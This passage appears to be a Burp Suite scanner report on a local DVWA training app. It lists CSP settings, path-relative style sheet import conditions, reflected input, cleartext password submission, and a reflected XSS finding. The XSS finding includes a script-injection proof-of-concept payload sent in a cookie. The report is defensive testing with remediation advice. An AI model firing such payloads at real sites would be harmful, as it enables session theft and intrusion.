<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:41 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;<br>Content-Length: 4146<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/csp/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=p38ekeeofotqdbvavvq3sdggpv<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://<span class="HIGHLIGHT">lwemR.com</span>:7878/dvwa/vulnerabilities/csp/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 14<br><br>include=573730</span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:23 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;<br>Content-Length: 4146<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="19.3">19.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#19.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csp/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csp/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=543ht5nu5hoh3jmb1e0d5b9v27<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:59 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;<br>Content-Length: 4113<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csp/<span class="HIGHLIGHT">index.php/b9yabo/liz4dr/lq28al/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=543ht5nu5hoh3jmb1e0d5b9v27<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:18 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;<br>Content-Length: 4113<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/csp/index.php/b9yabo/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=543ht5nu5hoh3jmb1e0d5b9v27<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:18 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;<br>Content-Length: 4113<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="19.4">19.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#19.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#20.1">Next</a>
<br>
<br><span class="TEXT">There are 2 instances of this issue:
<ul>
<li><a href="#19.4.1">/dvwa/vulnerabilities/csp/ [include parameter]</a></li>
<li><a href="#19.4.2">/dvwa/vulnerabilities/csp/ [security cookie]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="19.4.1">19.4.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [include parameter]</span>
<br><a class="PREVNEXT" href="#19.1.5">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19.4.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csp/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>include</b> request parameter is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/csp/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=ju5kvrfifhsepnvvancgup7h1n<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/csp/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 14<br><br>include=782731<span class="HIGHLIGHT">k3jz8nb9dp</span></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:10 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;<br>Content-Length: 4156<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;script src='782731<span class="HIGHLIGHT">k3jz8nb9dp</span>'&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="19.4.2">19.4.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [security cookie]</span>
<br><a class="PREVNEXT" href="#19.4.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#22.4.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csp/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csp/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">oceldueewo</span>; PHPSESSID=543ht5nu5hoh3jmb1e0d5b9v27<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:14 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=543ht5nu5hoh3jmb1e0d5b9v27; path=/<br>Set-Cookie: security=low<br>Content-Security-Policy: script-src 'self';<br>Content-Length: 4273<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=csp&amp;security=low<span class="HIGHLIGHT">oceldueewo</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=csp&amp;security=low<span class="HIGHLIGHT">oceldueewo</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="20">20.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csrf/</span>
<br><a class="PREVNEXT" href="#19">Previous</a>
&nbsp;<a class="PREVNEXT" href="#21">Next</a>
<br>
<span class="BODH1" id="20.1">20.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00300100_cleartextsubmissionofpassword">Cleartext submission of password</a></span>
<br><a class="PREVNEXT" href="#19.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#20.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csrf/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://localhost:7878/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change</li></ul>The form contains the following password fields:<ul><li>password_new</li><li>password_conf</li></ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/117.html">CAPEC-117: Interception</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=sjhvciv85o6upmpogbotaiukpc<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/csrf/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:28 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4494<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Cross Site Request Forgery (CSRF) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br>&lt;br /&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;form action="#" method="GET"&gt;</span><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;New password:&lt;br /&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;input type="password" AUTOCOMPLETE="off" name="password_new"&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br>&lt;br /&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;input type="password" AUTOCOMPLETE="off" name="password_conf"&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="20.2">20.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#20.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#20.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csrf/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>xpgx1'&gt;&lt;script&gt;alert(1)&lt;/script&gt;xxuc3</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
